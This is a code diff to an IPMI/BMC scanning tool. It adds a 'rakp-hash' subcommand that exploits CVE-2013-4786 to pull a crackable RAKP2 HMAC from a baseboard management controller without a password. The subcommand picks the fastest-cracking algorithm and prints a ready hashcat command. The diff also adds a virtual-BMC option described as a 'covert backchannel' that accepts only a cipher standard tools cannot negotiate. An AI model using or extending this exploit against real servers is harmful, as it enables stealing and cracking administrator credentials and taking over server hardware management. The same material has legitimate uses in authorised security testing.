@@ -30,6 +30,7 @@ RUN      zipmi [-H host] [-U user] [-P pass] [-A auth] [-t timeout]
            scan auth-caps     # sessionless Get Channel Auth Caps
            scan asf-ping
            scan ciphers [--verify]
+           scan rakp-hash     # grab crackable RAKP2 HMAC, no auth (CVE-2013-4786)
            scan all
 
 EXIT     0 on success; 1 on IPMI / transport error; 2 on usage error.
@@ -4517,7 +4518,8 @@ def cmd_vbmc_serve(args: argparse.Namespace) -> int:
         asyncio.run(run(persona_name=args.vpersona,
                         host=args.vbind, port=args.vport,
                         trace=trace, color=color,
-                        fixtures=getattr(args, "vfixtures", None)))
+                        fixtures=getattr(args, "vfixtures", None),
+                        only_cipher=getattr(args, "only_cipher", None)))
     except KeyboardInterrupt:
         print()
     return 0
@@ -4712,6 +4714,44 @@ def cmd_scan_cipher_suites(args: argparse.Namespace) -> int:
     if result.get("cipher0"):
         _msg.warn(f"ciphers {host}: cipher suite 0 advertised — "
                   f"run 'scan cipher-zero' to confirm exploitability")
+    return 0
+
+
+def cmd_scan_rakp_hash(args: argparse.Namespace) -> int:
+    """CVE-2013-4786 — grab a crackable RAKP2 HMAC without authenticating.
+
+    Negotiates the fastest-cracking auth algo the BMC will establish
+    (HMAC-MD5 > SHA1 > SHA256), sends RAKP1 for the given username, catches
+    RAKP2, and drops before RAKP3. Emits a hashcat-ready line. Needs only a
+    valid username (default root) — no password. Prepend the username to the
+    record for your own bookkeeping; the crack echoes the bare hash."""
+    host = _require_host(args)
+    s = Session(host=host, username=args.user, password=args.password or "x",
+                lanplus=True, timeout=args.timeout)
+    s.transport.port = args.port
+    _apply_trace(s.transport, args)
+    try:
+        result = s.grab_rakp_hashes(pad_username=getattr(args, "pad", False))
+    except Exception as e:
+        _msg.error(f"rakp-hash {host}: {e}")
+        return 2
+    finally:
+        s.transport.close()
+
+    if emit(args, result):
+        return 0 if result["hash"] else 1
+    for a in result["attempts"]:
+        if not a["ok"]:
+            _msg.info(f"{a['alg']:<11} suite {a['suite']:<2} -> {a['error']}")
+    h = result["hash"]
+    if not h:
+        _msg.error(f"rakp-hash {host}: no auth algorithm produced a hash")
+        return 1
+    _msg.info(f"{h['alg']}  ({len(h['auth_code']) // 2}-byte auth code)")
+    print(h["record"])                                   # record -> stdout (pipeable)
+    hexflag = " --hex-salt" if h["hex_salt"] else ""
+    _msg.info(f"to crack: hashcat -m {h['hc_mode']}{hexflag} "
+              f"<(echo '{h['line']}') wordlist.txt")
     return 0
 
 
@@ -6240,6 +6280,11 @@ def build_parser() -> argparse.ArgumentParser:
     vb_serve.add_argument("--fixtures", dest="vfixtures", default=None,
                           help="JSON of synthetic OEM responses (from "
                                "scripts/oem_sweep.py) for the vbmc to replay")
+    vb_serve.add_argument("--only-cipher", dest="only_cipher", type=int, default=None,
+                          metavar="N",
+                          help="covert backchannel: accept ONLY cipher suite N, "
+                               "0x11-reject all others (e.g. 4 = xRC4, which "
+                               "ipmitool/FreeIPMI can't negotiate)")
     vb_serve.set_defaults(func=cmd_vbmc_serve)
 
     # scan
@@ -6256,11 +6301,14 @@ def build_parser() -> argparse.ArgumentParser:
                      ("auth-caps", cmd_scan_auth_caps),
                      ("ciphers", cmd_scan_cipher_suites),
                      ("cipher-zero", cmd_scan_cipher_zero),
+                     ("rakp-hash", cmd_scan_rakp_hash),
                      ("unauth", cmd_scan_unauth),
                      ("all", cmd_scan_all)]:
-        kw = {"aliases": ["cipher-suites"]} if name == "ciphers" else {}
+        kw = {"aliases": ["cipher-suites"]} if name == "ciphers" else \
+             {"aliases": ["ripper"]} if name == "rakp-hash" else {}
         s = sc_sub.add_parser(name, help={
             "ciphers": "advertised RMCP+ cipher suites (--verify: which negotiate)",
+            "rakp-hash": "grab crackable RAKP2 HMAC, no auth (CVE-2013-4786); MD5>SHA1>SHA256",
             "unauth": "unauthenticated (sessionless) probes only",
             "all": "every probe (unauth + cipher-zero + user-matrix)",
         }.get(name), **kw)
@@ -6268,6 +6316,9 @@ def build_parser() -> argparse.ArgumentParser:
             s.add_argument("--verify", action="store_true",
                            help="unauth Open Session probe per suite: negotiates vs "
                                 "advertise-only (no RAKP/creds/access)")
+        if name == "rakp-hash":
+            s.add_argument("--pad", action="store_true",
+                           help="NUL-pad username to 16B (iDRAC-quirk targets only)")
         s.set_defaults(func=fn)
 
     return p
